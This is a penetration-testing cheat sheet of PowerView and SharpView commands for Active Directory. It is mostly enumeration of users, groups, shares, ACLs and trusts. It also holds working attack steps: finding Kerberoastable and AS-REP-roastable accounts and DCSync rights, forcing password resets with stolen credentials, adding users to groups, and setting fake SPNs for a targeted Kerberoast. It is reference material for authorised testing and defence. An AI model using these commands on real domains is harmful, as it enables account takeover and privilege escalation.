## Quick Reference

Common PowerView commands at a glance. Import the module first:

```powershell
Import-Module .\PowerView.ps1
```

---

## Domain Information

### Get Domain Object

Returns the AD object and details for the current domain.

```powershell
Get-Domain
Get-DomainPolicy
(Get-DomainPolicy)."SystemAccess"
```

### List All OUs

```powershell
Get-DomainOU
```

### View Domain Controllers

```powershell
Get-DomainController
```

### View Domain Trusts

```powershell
Get-DomainTrust
Get-DomainTrustMapping
Get-ForestTrust
```

---

## User Enumeration

### Get All Users

```powershell
Get-DomainUser
(Get-DomainUser).count
```

### Find Non-Blank Description Fields

Passwords are often stored in the Description field by lazy admins.

```powershell
Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -ne $null}
Get-DomainUser * | Select-Object samaccountname,description
```

### Find Kerberoastable Users (SPN Set)

```powershell
Get-DomainUser -SPN
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### Find ASREPRoastable Users

```powershell
Get-DomainUser -KerberosPreauthNotRequired
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

### Find Users with Kerberos Constrained Delegation

```powershell
Get-DomainUser -TrustedToAuth
```

### Find Users with Password Not Required

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### List All UAC Values for a User

```powershell
Get-DomainUser <username> | ConvertFrom-UACValue -showall
```

### Convert Username to SID / SID to Username

```powershell
Convert-NameToSid <username>
ConvertTo-SID <username>
Convert-SidToName <SID>

# SharpView equivalents
.\SharpView.exe ConvertTo-SID -Name <username>
.\SharpView.exe Convert-ADName -ObjectName <SID>
```

---

## Group Enumeration

### List All Groups

```powershell
Get-DomainGroup
Get-DomainGroup -Properties Name
```

### Get Members of a Group

```powershell
Get-DomainGroupMember -Identity "<group name>"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

### Find Protected Groups

```powershell
Get-DomainGroup -AdminCount
```

### Find Managed Security Groups

```powershell
Find-ManagedSecurityGroups
```

### Find Foreign Domain Users

```powershell
Find-ForeignGroup
Get-DomainForeignUser
Get-DomainForeignGroupMember
```

### Get Group Details (including ManagedBy)

```powershell
Get-DomainGroup -Properties * -Identity 'Citrix Admins' | select cn,managedby
```

---

## Computer Enumeration

### Get All Domain Computers

```powershell
Get-DomainComputer
(Get-DomainComputer).count
```

### Get Computer Details

```powershell
Get-DomainComputer -Identity <computer_name> -Properties *
```

### Find Computers with Description Set

```powershell
Get-DomainComputer -Properties description | Where-Object { $_.description -match '\w' }
```

### Find Computers with Unconstrained Delegation

```powershell
Get-DomainComputer -Unconstrained
```

### Find Computers with Constrained Delegation

```powershell
Get-DomainComputer -TrustedToAuth
```

---

## GPO Enumeration

### List All GPOs

```powershell
Get-DomainGPO
Get-DomainGPO | findstr displayname
Get-DomainGPO | select displayname
```

### Get GPO Applied to a Specific Host

```powershell
Get-DomainGPO -ComputerIdentity <computer_name>
gpresult /r /S <workstation>
```

### Find GPO Permissions

```powershell
Get-DomainGPO | Get-ObjectAcl
```

---

## Share Enumeration

### Find All Shares on a Host

```powershell
Get-NetShare -ComputerName <computer_name>
```

### Find Non-Standard Shares

```powershell
Get-NetShare -ComputerName <computer_name> | Where-Object { $_.Name -notmatch "^(ADMIN\$|C\$|IPC\$)$" }
```

### Find Reachable Domain Shares

```powershell
Find-DomainShare
Find-InterestingDomainShareFile
```

### Get ACLs on a Share Path

```powershell
Get-PathAcl "\\<sql-server>\DB_backups"
```

### Get File Servers

```powershell
Get-DomainFileServer
Get-DomainDFSShare
```

---

## Local Group Enumeration

### Get Local Groups on a Host

```powershell
Get-NetLocalGroup -ComputerName <workstation>
Get-NetLocalGroupMember -ComputerName <workstation>
```

### Test Local Admin Access

```powershell
Test-AdminAccess -ComputerName <sql-server>
```

### Find Machines Where Users Are Logged In

```powershell
Find-DomainUserLocation
```

### Find Machines Where Current User Has Local Admin

```powershell
Find-LocalAdminAccess
```

---

## ACL Enumeration and Abuse

### Find Interesting ACLs (Non-Built-In Objects)

```powershell
Find-InterestingDomainAcl
```

### Get ACLs for a Specific User

```powershell
Get-DomainObjectAcl -Identity <username>
$sid = Convert-NameToSid <username>
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

### Find DCSync Rights

```powershell
$dcsync = Get-ObjectACL "DC=<domain>,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
Convert-SidToName $dcsync
```

### Get ACLs on a Specific User (generic)

```powershell
(Get-ACL "AD:$((Get-ADUser <username>).distinguishedname)").Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" }
```

---

## ACL Abuse

### Change a User's Password via ForceChangePassword Right

```powershell
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<username>', $SecPassword)
$targetPassword = ConvertTo-SecureString '<new-password>' -AsPlainText -Force
Set-DomainUserPassword -Identity <target-username> -AccountPassword $targetPassword -Credential $Cred -Verbose
```

### Add User to Group

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members '<target-username>' -Credential $Cred2 -Verbose
```

### Remove User from Group (Cleanup)

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members '<target-username>' -Credential $Cred2 -Verbose
```

### Set Fake SPN on a User (Targeted Kerberoast)

```powershell
Set-DomainObject -Credential $Cred2 -Identity <username> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

### Clear Fake SPN (Cleanup)

```powershell
Set-DomainObject -Credential $Cred2 -Identity <username> -Clear serviceprincipalname -Verbose
```

---

## Trust Enumeration

### Get Domain SID

```powershell
Get-DomainSID
```

### Get Enterprise Admins Group SID

```powershell
Get-DomainGroup -Domain <DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

### Enumerate Users in Child Domain

```powershell
Get-DomainUser -Domain <child-domain> | select SamAccountName
```

### Enumerate Foreign SPNs (Cross-Forest Kerberoast)

```powershell
Get-DomainUser -SPN -Domain <external-domain> | select SamAccountName
Get-DomainUser -Domain <external-domain> -Identity mssqlsvc | select samaccountname,memberof
Get-DomainForeignGroupMember -Domain <external-domain>
```

### Export PowerView Results to CSV

```powershell
Export-PowerViewCSV
```

---

## SharpView Examples

SharpView is a .NET port of PowerView, useful when PowerShell is restricted.

```powershell
.\SharpView.exe Get-Domain
.\SharpView.exe Get-DomainOU
.\SharpView.exe Get-DomainUser -KerberosPreauthNotRequired
.\SharpView.exe Get-DomainGPO | findstr displayname
.\SharpView.exe Get-NetShare -ComputerName <sql-server>
.\SharpView.exe Get-DomainGroupMember -Identity 'Help Desk'
.\SharpView.exe Get-DomainGroup -AdminCount
.\SharpView.exe Find-ManagedSecurityGroups
.\SharpView.exe Get-NetLocalGroupMember -ComputerName <workstation>
.\SharpView.exe Get-DomainComputer -Unconstrained
.\SharpView.exe Get-DomainUser -SPN
.\SharpView.exe Get-DomainUser -Help
```
